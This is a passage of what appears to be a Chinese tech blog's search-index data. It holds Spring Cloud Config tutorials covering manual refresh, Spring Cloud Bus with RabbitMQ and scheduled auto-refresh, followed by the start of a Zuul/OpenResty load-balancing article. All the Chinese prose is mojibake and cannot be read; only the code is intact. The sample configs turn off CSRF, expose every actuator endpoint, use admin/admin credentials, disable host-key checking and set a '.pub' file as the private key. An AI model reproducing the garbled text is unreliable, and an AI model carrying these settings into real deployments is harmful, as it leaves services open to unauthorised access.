è½½çš„ï¼Œåªæœ‰åœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ä¼šè¢«åˆå§‹åŒ–ï¼›åˆ·æ–° Bean ä¹Ÿæ˜¯åŒç†ï¼Œåˆ·æ–°åä¸‹æ¬¡è®¿é—®ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„å¯¹è±¡ 123456789101112131415@Component@RefreshScopepublic class ConfigProperties { @Value("${cn.springcloud.config}") private String config; public String getConfig() { return config; } public void setConfig(String config) { this.config = config; }} 123456789101112@RefreshScope@RestControllerpublic class ConfigController { @Autowired public ConfigProperties configProperties; @GetMapping("/getConfigInfo") public String getConfigInfo() { return configProperties.getConfig(); }} iiii. æµ‹è¯•ç»“æœ ä¾æ¬¡å¯åŠ¨ config-serverã€config-client åº”ç”¨ è®¿é—® http://127.0.0.1:9001/getConfigInfoï¼Œæ¥å£ä¼šè¿”å› I am the git configuration file from dev environment æ›´æ”¹ Git è¿œç¨‹ä»“åº“ä¸­çš„ config-client-dev.yml é…ç½®æ–‡ä»¶ï¼Œå°†å†…å®¹ä¿®æ”¹ä¸º I am the git configuration file from dev environment updated é€šè¿‡ Post è¯·æ±‚è®¿é—® http://127.0.0.1:9001/actuator/refreshï¼Œè®© Config Client åˆ·æ–°é…ç½®ä¿¡æ¯ å†æ¬¡è®¿é—® http://127.0.0.1:9001/getConfigInfoï¼Œæ¥å£ä¼šè¿”å› I am the git configuration file from dev environment updatedï¼Œè¯´æ˜é…ç½®æ›´æ–°äº† ç»“åˆ Spring Cloud Bus çƒ­æ›´æ–°Spring Cloud Config ç»“åˆ Spring Cloud Bus è¿›è¡Œåˆ·æ–°çš„æ•´ä½“æµç¨‹å›¾å¦‚ä¸‹ï¼Œå½“ç”¨æˆ·æ›´æ–°é…ç½®ä¿¡æ¯æ—¶ï¼Œè§¦å‘ Git Hook é…ç½®åœ°å€çš„è°ƒç”¨ï¼ŒConfig Server æ¥æ”¶åˆ° Refresh è¯·æ±‚åï¼Œé€šè¿‡ Bus å°†æ¶ˆæ¯å‘é€åˆ° Config Clientï¼Œå½“ Config Client æ¥æ”¶åˆ°æ¶ˆæ¯åä¼šé‡æ–°å‘é€è¯·æ±‚åŠ è½½é…ç½®ä¿¡æ¯ï¼Œå¤§ä½“æµç¨‹å°±æ˜¯è¿™æ ·ã€‚ä¸‹é¢å°†ä½¿ç”¨ RabbitMQ ä½œä¸ºæ¶ˆæ¯ä¸­é—´ä»¶ï¼Œç”±äºç¯‡å¹…æœ‰é™ï¼Œè¿™é‡Œä¸å†è®²è§£ RabbitMQ çš„å®‰è£…å’Œä½¿ç”¨æ–¹æ³•ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ 1. å‡†å¤‡å·¥ä½œæœ¬ç¤ºä¾‹ç”¨åˆ°ä¸Šé¢å…¥é—¨æ¡ˆä¾‹ä¸­ Git ä»“åº“é‡Œçš„é…ç½®æ–‡ä»¶ï¼ŒåŒ…æ‹¬ config-client-dev.ymlã€config-client-prod.ymlã€config-client-test.ymlã€‚ 2. åˆ›å»º Config Server å·¥ç¨‹åˆ›å»º Config Server çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œç¬¬äºŒä¸ªä¾èµ–æ˜¯ç«¯ç‚¹çš„è®¿é—®ä¾èµ–ï¼Œç¬¬ä¸‰ä¸ªä¾èµ–æ˜¯å®‰å…¨çš„ä¾èµ–ï¼Œç¬¬å››ä¸ªæ˜¯æ¶ˆæ¯ä¸­é—´ä»¶çš„ä¾èµ–ï¼š 12345678910111213141516&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-bus-amqp&lt;/artifactId&gt;&lt;/dependency&gt; åˆ›å»º Config Server çš„ä¸»å¯åŠ¨ç±»ï¼Œå¢åŠ  @EnableConfigServer æ³¨è§£ï¼š 12345678@EnableConfigServer@SpringBootApplicationpublic class ConfigServerApplication { public static void main(String[] args) { SpringApplication.run(ConfigServerApplication.class, args); }} åˆ›å»º Config Server çš„å®‰å…¨é…ç½®ç±»ï¼Œä¸»è¦ä½œç”¨æ˜¯å…³é—­ç«¯ç‚¹è®¿é—®çš„å®‰å…¨æ ¡éªŒï¼š 12345678@Configurationpublic class SecurityConfiguration extends WebSecurityConfigurerAdapter { @Override protected void configure(HttpSecurity http) throws Exception { http.csrf().disable(); }} æ·»åŠ  Config Server éœ€è¦çš„ application.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ï¼Œå…¶ä¸­åŒ…æ‹¬ RabbitMQ çš„åœ°å€å’Œè´¦å·ä¿¡æ¯ï¼Œspring.cloud.bus.trace.enabled=true è¡¨ç¤ºå¼€å¯æ¶ˆæ¯è·Ÿè¸ªï¼š 12345678910111213141516171819202122232425262728293031server: port: 8001spring: application: name: config-server rabbitmq: port: 5672 host: localhost username: admin password: admin cloud: bus: trace: enabled: true config: server: git: uri: git@github.com:xxxxx/spring-cloud-config-study-repo.git search-paths: spring-cloud-config-study-repo/ strictHostKeyChecking: false private_key_file: /root/.ssh/id_rsa.pub label: mastermanagement: endpoints: web: exposure: include: "*" health: show-details: always 3. åˆ›å»º Config Client å·¥ç¨‹åˆ›å»º Config Client çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œç¬¬äºŒä¸ªä¾èµ–æ˜¯ç«¯ç‚¹çš„è®¿é—®ä¾èµ–ï¼Œç¬¬ä¸‰ä¸ªä¾èµ–æ˜¯å®‰å…¨çš„ä¾èµ–ï¼Œç¬¬å››ä¸ªæ˜¯æ¶ˆæ¯ä¸­é—´ä»¶çš„ä¾èµ–ï¼š 12345678910111213141516&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-bus-amqp&lt;/artifactId&gt;&lt;/dependency&gt; å¾€ Config Client æ·»åŠ å®‰å…¨é…ç½®ç±»ï¼Œä¸»è¦ä½œç”¨æ˜¯å…³é—­ç«¯ç‚¹è®¿é—®çš„å®‰å…¨æ ¡éªŒï¼š 12345678@Configurationpublic class SecurityConfiguration extends WebSecurityConfigurerAdapter { @Override protected void configure(HttpSecurity http) throws Exception { http.csrf().disable(); }} ä¸ºäº†æ›´å¥½åœ°è§‚å¯Ÿæ‹‰å–åˆ°çš„ Git ä¸Šé¢çš„é…ç½®ï¼Œè¿™é‡Œéœ€è¦åˆ›å»ºä¸€ä¸ª Controller ç”¨äºè®¿é—®è¿”å›é…ç½®ä¿¡æ¯ï¼ŒåŒæ—¶è¿˜éœ€è¦åˆ›å»ºä¸€ä¸ªå®ä½“ï¼Œç”¨äºæ³¨å…¥è¿œç¨‹é…ç½®ä¸Šçš„ä¿¡æ¯ï¼›æ³¨æ„ï¼Œè¿™é‡Œçš„ ConfigProperties ä¸ ConfigController ç±»éƒ½éœ€è¦é¢å¤–æ·»åŠ  @RefreshScope æ³¨è§£ 123456789101112131415@Component@RefreshScopepublic class ConfigProperties { @Value("${cn.springcloud.config}") private String config; public String getConfig() { return config; } public void setConfig(String config) { this.config = config; }} 123456789101112@RefreshScope@RestControllerpublic class ConfigController { @Autowired public ConfigProperties configProperties; @GetMapping("/getConfigInfo") public String getConfigInfo() { return configProperties.getConfig(); }} æ·»åŠ  Config Client éœ€è¦çš„ application.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ï¼Œå…¶ä¸­åŒ…æ‹¬ RabbitMQ çš„åœ°å€å’Œè´¦å·ä¿¡æ¯ï¼Œspring.cloud.bus.trace.enabled=true è¡¨ç¤ºå¼€å¯æ¶ˆæ¯è·Ÿè¸ªï¼š 1234567891011121314151617181920spring: application: name: config-client rabbitmq: port: 5672 host: localhost username: admin password: admin cloud: bus: trace: enabled: truemanagement: endpoints: web: exposure: include: "*" health: show-details: always æ·»åŠ  Config Client éœ€è¦çš„ bootstrap.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ï¼š 1234567spring: cloud: config: name: config-client #éœ€è¦ä»è¿œç¨‹Gitä»“åº“è¯»å–çš„é…ç½®æ–‡ä»¶çš„åç§°ï¼Œæ³¨æ„æ²¡æœ‰"yml"æ–‡ä»¶åç¼€ï¼Œå¯ä»¥å†™å¤šä¸ªï¼Œé€šè¿‡é€—å·éš”å¼€ profile: dev #æœ¬æ¬¡è®¿é—®çš„é…ç½®é¡¹ label: master #Gitåˆ†æ”¯çš„åç§° uri: http://127.0.0.1:8001 #Config Serverçš„åœ°å€ 4. æµ‹è¯•ç»“æœ ä¾æ¬¡å¯åŠ¨ config-serverã€config-client åº”ç”¨ è®¿é—® http://127.0.0.1:9001/getConfigInfoï¼Œæ¥å£ä¼šè¿”å› I am the git configuration file from dev environment æ›´æ”¹ Git è¿œç¨‹ä»“åº“ä¸­çš„ config-client-dev.yml é…ç½®æ–‡ä»¶ï¼Œå°†å†…å®¹ä¿®æ”¹ä¸º I am the git configuration file from dev environment updated é€šè¿‡ Post è¯·æ±‚è®¿é—® http://127.0.0.1:8001/actuator/bus-refreshï¼Œè®© Config Server é€šè¿‡ Spring Cloud Bus å‘é€æ¶ˆæ¯é€šçŸ¥æ‰€æœ‰ Config Client åˆ·æ–°é…ç½®ä¿¡æ¯ å†æ¬¡è®¿é—® http://127.0.0.1:9001/getConfigInfoï¼Œæ¥å£ä¼šè¿”å› I am the git configuration file from dev environment updatedï¼Œè¯´æ˜é…ç½®æ›´æ–°äº†æç¤ºï¼šå¯ä»¥å°† Spring Cloud Bus çš„åˆ·æ–°åœ°å€é…ç½®åœ¨ WebHooks ä¸Šé¢ï¼Œè¿™æ ·åœ¨ Git ä»“åº“æ¯æ¬¡æœ‰æ–°æ–‡ä»¶æäº¤ï¼ˆPushï¼‰ä¹‹åï¼Œæ‰€æœ‰ Config Client éƒ½ä¼šè‡ªåŠ¨æ‰§è¡Œåˆ·æ–°çš„åŠ¨ä½œ Config Client è‡ªåŠ¨åˆ·æ–°ï¼ˆä»»åŠ¡è°ƒåº¦ï¼‰åœ¨æœ‰äº›åº”ç”¨ä¸Šé¢ï¼Œä¸éœ€è¦åœ¨æœåŠ¡ç«¯æ‰¹é‡æ¨é€æ¶ˆæ¯çš„æ—¶å€™ï¼Œå®¢æˆ·ç«¯æœ¬èº«éœ€è¦è·å–å‚æ•°å˜åŒ–çš„æƒ…å†µï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨å®¢æˆ·ç«¯çš„è‡ªåŠ¨åˆ·æ–°åŠŸèƒ½ï¼Œå…¶åŸç†æ˜¯ä½¿ç”¨ä»»åŠ¡è°ƒåº¦æ‰§è¡Œåˆ·æ–°æ“ä½œï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç  1. å‡†å¤‡è¯´æ˜æœ¬ç¤ºä¾‹ç”¨åˆ°ä¸Šé¢å…¥é—¨æ¡ˆä¾‹ä¸­ Git ä»“åº“é‡Œçš„é…ç½®æ–‡ä»¶ï¼ŒåŒ…æ‹¬ config-client-dev.ymlã€config-client-prod.ymlã€config-client-test.ymlã€‚ 2. Config Refresh Autoconfig å·¥ç¨‹åˆ›å»º Config Refresh Autoconfig çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼š 123456789101112&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-autoconfigure&lt;/artifactId&gt;&lt;/dependency&gt; åˆ›å»º Config Refresh Autoconfig å·¥ç¨‹é‡Œçš„è‡ªåŠ¨é…ç½®ç±»ï¼Œæ·»åŠ ç›¸å…³æ³¨è§£ï¼Œä½¿å…¶åœ¨ Spring Boot å¯åŠ¨çš„æ—¶å€™å°†å…¶åŠ è½½ã€‚åœ¨è¯¥ç±»ä¸­ï¼Œä¸»è¦æ˜¯æ³¨å…¥äº†ç«¯ç‚¹ç±»ï¼Œé€šè¿‡å®šæ—¶ä»»åŠ¡å’Œåˆ·æ–°æ—¶é—´ï¼Œè¿›è¡Œé…ç½®è¯·æ±‚åˆ·æ–°ã€‚ç”±äºåœ¨ç±»ä¸­æ˜¯ç›´æ¥è°ƒç”¨äº† RefreshEndpoint çš„ refresh() æ–¹æ³•ï¼Œæ‰€ä»¥å¯¹äº F ç‰ˆçš„å®‰å…¨æœºåˆ¶ä¸éœ€è¦å¯¹ç«¯ç‚¹è¿›è¡Œæ‰“å¼€ä¹Ÿå¯ä»¥ï¼Œä½†éœ€è¦ä¾èµ– spring-boot-starter-actuatorï¼Œå¦åˆ™æ— æ³•æ³¨å…¥ RefreshEndpoint çš„ Beanï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152@ConditionalOnClass(RefreshEndpoint.class)@ConditionalOnProperty("spring.cloud.config.refreshInterval")@AutoConfigureAfter(RefreshAutoConfiguration.class)@Configurationpublic class ConfigAutoRefreshConfiguration implements SchedulingConfigurer { private static final Logger logger = LoggerFactory.getLogger(ConfigAutoRefreshConfiguration.class); /** * é—´éš”åˆ·æ–°æ—¶é—´ */ @Value("${spring.cloud.config.refreshInterval}") private long refreshInterval; /** * åˆ·æ–°çš„ç«¯ç‚¹ */ @Autowired private RefreshEndpoint refreshEndpoint; @Override public void configureTasks(ScheduledTaskRegistrar scheduledTaskRegistrar) { final long interval = getRefreshIntervalInMilliseconds(); logger.info(String.format("Scheduling config refresh task with %s second delay", refreshInterval)); scheduledTaskRegistrar.addFixedDelayTask(new IntervalTask(new Runnable() { @Override public void run() { refreshEndpoint.refresh(); } }, interval, interval)); } /** * ä»¥æ¯«ç§’ä¸ºå•ä½è¿”å›åˆ·æ–°é—´éš” * * @return */ private long getRefreshIntervalInMilliseconds() { return refreshInterval * 1000; } /** * å¦‚æœæ²¡æœ‰åœ¨ä¸Šä¸‹æ–‡ä¸­æ³¨å†Œï¼Œåˆ™å¯ç”¨è°ƒåº¦ç¨‹åº */ @ConditionalOnMissingBean(ScheduledAnnotationBeanPostProcessor.class) @EnableScheduling @Configuration protected static class EnableSchedulingConfigProperties { }} åœ¨ Config Refresh Autoconfig å·¥ç¨‹é‡Œåˆ›å»º /src/main/resources/META-INF/spring.factories é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ ä¸Šé¢çš„è‡ªåŠ¨é…ç½®ç±»ï¼š 12org.springframework.boot.autoconfigure.EnableAutoConfiguration=\\com.springcloud.study.config.ConfigAutoRefreshConfiguration 3. Cofnig Client å·¥ç¨‹è¿™é‡Œ Cofnig Client å·¥ç¨‹çš„ä»£ç åŸºæœ¬ä¸ä¸Šé¢çš„ â€œConfig Client æ‰‹åŠ¨åˆ·æ–°â€ ç¤ºä¾‹çš„ä»£ç ä¸€è‡´ï¼Œæ‹·è´ä¸€ä»½å³å¯ï¼Œè¿™é‡Œä¸å†ç´¯è¿°ã€‚ Cofnig Client å·¥ç¨‹çš„ pom.xml æ–‡ä»¶ï¼Œå¼•å…¥ config-refresh-autoconfig ä¾èµ–ï¼š 123456789&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.springcloud.study&lt;/groupId&gt; &lt;artifactId&gt;config-refresh-autoconfig&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/dependency&gt; Cofnig Client å·¥ç¨‹çš„ application.yml æ–‡ä»¶ï¼ŒrefreshInterval: 15 è¡¨ç¤ºæ¯ 15 ç§’åˆ·æ–°ä¸€æ¬¡é…ç½®ä¿¡æ¯ï¼š 123456spring: application: name: config-client cloud: config: refreshInterval: 15 4. Cofnig Server å·¥ç¨‹è¿™é‡Œ Cofnig Server å·¥ç¨‹çš„ä»£ç åŸºæœ¬ä¸ä¸Šé¢çš„ â€œConfig Client æ‰‹åŠ¨åˆ·æ–°â€ ç¤ºä¾‹çš„ä»£ç ä¸€è‡´ï¼Œæ‹·è´ä¸€ä»½å³å¯ï¼Œè¿™é‡Œä¸å†ç´¯è¿°ã€‚ 5. æµ‹è¯•ç»“æœ ä¾æ¬¡å¯åŠ¨ config-serverã€config-client åº”ç”¨ è®¿é—® http://127.0.0.1:9001/getConfigInfoï¼Œæ¥å£ä¼šè¿”å› I am the git configuration file from dev environment æ›´æ”¹ Git è¿œç¨‹ä»“åº“ä¸­çš„ config-client-dev.yml é…ç½®æ–‡ä»¶ï¼Œå°†å†…å®¹ä¿®æ”¹ä¸º I am the git configuration file from dev environment updated ç­‰å¾…ä¸€æ®µæ—¶é—´åï¼ˆ15 ç§’ï¼‰ï¼Œå†æ¬¡è®¿é—® http://127.0.0.1:9001/getConfigInfoï¼Œæ¥å£ä¼šè¿”å› I am the git configuration file from dev environment updatedï¼Œè¯´æ˜é…ç½®æ›´æ–°äº† ä¸‹ç¯‡ - Config å…¥é—¨æ•™ç¨‹ï¼ˆä¸­çº§ç¯‡ï¼‰ Config å…¥é—¨æ•™ç¨‹ - ä¸­çº§ç¯‡ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"Zuul å…¥é—¨æ•™ç¨‹ - é«˜çº§ç¯‡",url:"/posts/9652d40e.html",text:'ä¸Šç¯‡ - Zuul å…¥é—¨æ•™ç¨‹ï¼ˆä¸­çº§ç¯‡ï¼‰ Zuul å…¥é—¨æ•™ç¨‹ - ä¸­çº§ç¯‡ å‰è¨€ç‰ˆæœ¬è¯´æ˜åœ¨æœ¬æ–‡ä¸­ï¼Œé»˜è®¤ä½¿ç”¨çš„ Spring Cloud ç‰ˆæœ¬æ˜¯ Finchley.RELEASEï¼Œå¯¹åº”çš„ Spring Boot ç‰ˆæœ¬æ˜¯ 2.0.3ï¼ŒZuul ç‰ˆæœ¬æ˜¯ 1.xï¼Œç‰¹åˆ«å£°æ˜é™¤å¤–ã€‚ Zuul å¤šå±‚è´Ÿè½½ç—›ç‚¹åœºæ™¯åœ¨ Spring Cloud å¾®æœåŠ¡æ¶æ„ä½“ç³»ä¸­ï¼Œæ‰€æœ‰è¯·æ±‚çš„å‰é—¨çš„ç½‘å…³ Zuul æ‰¿æ‹…ç€è¯·æ±‚è½¬å‘çš„ä¸»è¦åŠŸèƒ½ï¼Œå¯¹åç«¯æœåŠ¡èµ·ç€ä¸¾è¶³è½»é‡çš„ä½œç”¨ã€‚å½“ä¸šåŠ¡ä½“é‡çŒ›å¢ä¹‹åï¼Œå¾—ç›Šäº Spring Cloud çš„æ¨ªå‘æ‰©å±•èƒ½åŠ›ï¼Œå¾€å¾€åŠ èŠ‚ç‚¹ã€åŠ æœºå™¨å°±å¯ä»¥ä½¿å¾—ç³»ç»Ÿæ”¯æ’‘æ€§è·å¾—å¤§å¤§æå‡ï¼Œä½†æ˜¯ä»…ä»…åŠ æœåŠ¡è€Œä¸åŠ ç½‘å…³æ˜¯ä¼šæœ‰æ€§èƒ½ç“¶é¢ˆçš„ï¼Œå•ä¸€ Zuul èŠ‚ç‚¹çš„å¤„ç†èƒ½åŠ›ååˆ†æœ‰é™ã€‚å› æ­¤æ‰©å¼ èŠ‚ç‚¹å¾€å¾€æ˜¯å¾®æœåŠ¡è¿å¸¦ Zuul ä¸€èµ·æ‰©å¼ ï¼Œä¸€èˆ¬ä¼šéƒ¨ç½²ä¸€ä¸ª Zuul é›†ç¾¤æ¥æ¨ªå‘æ‰©å±•å¾®æœåŠ¡åº”ç”¨ï¼Œç„¶åå†åœ¨è¯·æ±‚ä¸Šå±‚åŠ ä¸€å±‚è½¯è´Ÿè½½ï¼Œé€šå¸¸æ˜¯ä½¿ç”¨ Nginx å‡åˆ†è¯·æ±‚åˆ° Zuul é›†ç¾¤ï¼ˆå¦‚ä¸‹å›¾ï¼‰ã€‚æ­¤æ—¶è‹¥å…¶ä¸­ä¸€å° Zuul æœåŠ¡æŒ‚æ‰äº†ï¼Œç”±äºä» Nginx åˆ° Zuul å…¶å®æ˜¯æ²¡æœ‰ä»€ä¹ˆå…³è”æ€§ï¼Œå¦‚æœ Zuul æœåŠ¡å®•æ‰ï¼ŒNginx è¿˜æ˜¯ä¼šæŠŠè¯·æ±‚å¯¼å‘åˆ° Zuul æœåŠ¡ï¼Œå¯¼è‡´ä» Nginx åˆ°è¿™ Zuul èŠ‚ç‚¹çš„è¯·æ±‚ä¼šå…¨éƒ¨å¤±æ•ˆï¼Œåœ¨ Nginx æ²¡æœ‰é‡‡å–ç›¸å…³åº”å¯¹æªæ–½çš„æƒ…å†µä¸‹ï¼Œè¿™æ˜¯ååˆ†ä¸¥é‡çš„é—®é¢˜ã€‚ è§£å†³æ–¹æ¡ˆOpenResty æ•´åˆäº† Nginx ä¸ Luaï¼Œå®ç°äº†å¯ä¼¸ç¼©çš„ Web æœåŠ¡å™¨ï¼Œå†…éƒ¨é›†æˆäº†å¤§é‡ç²¾è‰¯çš„ Lua åº“ã€ç¬¬ä¸‰æ–¹æ¨¡å—ä»¥åŠå¤šæ•°çš„ä¾èµ–é¡¹ï¼Œèƒ½å¤Ÿéå¸¸å¿«æ·åœ°æ­å»ºå¤„ç†è¶…é«˜å¹¶å‘ã€æ‰©å±•æ€§æé«˜çš„åŠ¨æ€ Web åº”ç”¨ã€Web æœåŠ¡å’ŒåŠ¨æ€ç½‘å…³ã€‚å¼€å‘è€…å¯ä»¥ä½¿ç”¨ Lua è„šæœ¬æ¨¡å—ä¸æ³¨å†Œä¸­å¿ƒæ„å»ºä¸€ä¸ªæœåŠ¡åŠ¨æ€å¢å‡çš„æœºåˆ¶ï¼Œé€šè¿‡ Lua è·å–æ³¨å†Œä¸­å¿ƒçŠ¶æ€ä¸º UP çš„æœåŠ¡ï¼ŒåŠ¨æ€åœ°åŠ å…¥åˆ° Nginx çš„è´Ÿè½½å‡è¡¡åˆ—è¡¨ä¸­å»ï¼Œç”±äºè¿™ç§æ¶æ„æ¨¡å¼æ¶‰åŠäº†ä¸æ­¢ä¸€ä¸ªè´Ÿè½½å‡è¡¡å™¨ï¼Œä¸€èˆ¬ç§°å…¶ä¸º â€œå¤šå±‚è´Ÿè½½â€ï¼ˆå¦‚ä¸‹å›¾ï¼‰ã€‚ ç›®å‰ Spring Cloud ä¸­å›½ç¤¾åŒºé’ˆå¯¹è¿™ä¸€åœºæ™¯å¼€æºäº†ç›¸å…³çš„ Lua æ’ä»¶æºç ï¼ŒGitHub åœ°å€åœ¨è¿™é‡Œï¼Œæ ¸å¿ƒé…ç½®å¦‚ä¸‹ã€‚å®ç°åŸç†æ˜¯ä½¿ç”¨ Lua è„šæœ¬å®šæ—¶æ ¹æ®é…ç½®çš„æœåŠ¡åä¸ Eureka åœ°å€ï¼Œå»æ‹‰å–è¯¥æœåŠ¡çš„ä¿¡æ¯ï¼Œåœ¨ Eureka é‡Œé¢æä¾› /eureka/apps/(serviceld) ç«¯ç‚¹ï¼Œè¿”å›æœåŠ¡çš„æ³¨å†Œä¿¡æ¯ï¼Œæ‰€ä»¥åªéœ€è¦å–ç”¨çŠ¶æ€ä¸º UP çš„æœåŠ¡ï¼Œå°†å®ƒçš„åœ°å€åŠ å…¥ Nginx è´Ÿè½½åˆ—è¡¨å³å¯ã€‚æ­¤é¡¹ç›®ä½¿å¾— Nginx ä¸ Zuul ä¹‹é—´ æ‹¥æœ‰ä¸€ä¸ªåŠ¨æ€æ„ŸçŸ¥èƒ½åŠ›ï¼Œä¸ç”¨æ‰‹åŠ¨é…ç½® Nginx è´Ÿè½½ä¸ Zuul è´Ÿè½½ï¼Œè¿™æ ·å¯¹äºåº”ç”¨å¼¹æ€§æ‰©å±•æ˜¯æå…¶å‹å¥½çš„ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455http { #sharing cache area lua_shared_dict dynamic_eureka_balancer 128m; init_worker_by_lua_block { -- init eureka balancer local file = require "resty.dynamic_eureka_balancer" local balancer = file:new({dict_name="dynamic_eureka_balancer"}) --eureka server list balancer.set_eureka_service_url({"127.0.0.1:8888", "127.0.0.1:9999"}) --eureka basic authentication --use this setting if eureka has enabled basic authentication. --note: basic authentication must use BASE64 encryption in `user:password` format --balancer.set_eureka_service_basic_authentication("") --The service name that needs to be monitored balancer.watch_service({"zuul", "client"}) } upstream springcloud_cn { server 127.0.0.1:666; # Required, because empty upstream block is rejected by nginx (nginx+ can use \'zone\' instead) balancer_by_lua_block { --The zuul name that needs to be monitored local service_name = "zuul" local file = require "resty.dynamic_eureka_balancer" local balancer = file:new({dict_name="dynamic_eureka_balancer"}) --balancer.ip_hash(service_name) --IP Hash LB balancer.round_robin(service_name) --Round Robin LB } } server { listen 80; server_name localhost; location / { proxy_pass http://springcloud_cn/; proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } }} Zuul åº”ç”¨ä¼˜åŒ–æ¦‚è¿°Zuulï¼ˆè¿™é‡ŒæŒ‡ Zuul1.0 ç‰ˆæœ¬ï¼ŒZuul2.0 ç‰ˆæœ¬ä¹‹åä½¿ç”¨äº† Netty çš„å¼‚æ­¥éé˜»å¡æ¨¡å‹ï¼‰åœ¨ç»™å¾®æœåŠ¡ä½“ç³»å¸¦æ¥è¯¸å¤šä¾¿åˆ©çš„åŒæ—¶ï¼Œä¹Ÿé¥±å—ç€æ€§èƒ½çš„äº‰è®®ï¼Œè¿™ä¸€åˆ‡è¿˜è¦ä»å®ƒçš„åº•å±‚æ¶æ„è¯´èµ·ã€‚Zuul æ˜¯å»ºç«‹åœ¨ Servlet çš„åŒæ­¥é˜»å¡æ¶æ„åŸºç¡€ä¸Šï¼Œæ‰€ä»¥åœ¨å¤„ç†é€»è¾‘ä¸Šé¢æ˜¯å’Œçº¿ç¨‹å¯†ä¸å¯åˆ†çš„ï¼Œæ¯ä¸€æ¬¡è¯·æ±‚éƒ½éœ€è¦ä»çº¿ç¨‹æ± è·å–ä¸€ä¸ªçº¿ç¨‹æ¥ç»´æŒ I/O æ“ä½œï¼Œè·¯ç”±è½¬å‘çš„æ—¶å€™åˆéœ€è¦ä» HTTP å®¢æˆ·ç«¯è·å–çº¿ç¨‹æ¥ç»´æŒè¿æ¥ï¼Œè¿™å°±ä¼šå¯¼è‡´ä¸€ä¸ªç»„ä»¶å ç”¨ä¸¤ä¸ªçº¿ç¨‹èµ„æºçš„æƒ…å†µã€‚æ‰€ä»¥ï¼Œåœ¨ Zuul çš„ä½¿ç”¨ä¸­ï¼Œå¯¹è¿™éƒ¨åˆ†çš„ä¼˜åŒ–æ˜¯å¾ˆæœ‰å¿…è¦çš„ï¼Œä¸€ä¸ªå¥½çš„ä¼˜åŒ–ä½“ç³»ä¼šä½¿å¾—åº”ç”¨æ”¯æ’‘çš„ä¸šåŠ¡ä½“é‡æ›´å¤§ï¼Œä¹Ÿèƒ½æœ€å¤§åŒ–åˆ©ç”¨æœåŠ¡å™¨èµ„æºã€‚åœ¨è¿™é‡Œï¼Œå°†å¯¹ Zuul çš„ä¼˜åŒ–åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªç±»å‹ï¼š å®¹å™¨ä¼˜åŒ–ï¼šå†…ç½®å®¹å™¨ Tomcat ä¸ Undertow çš„æ¯”è¾ƒä¸å‚æ•°è®¾ç½® 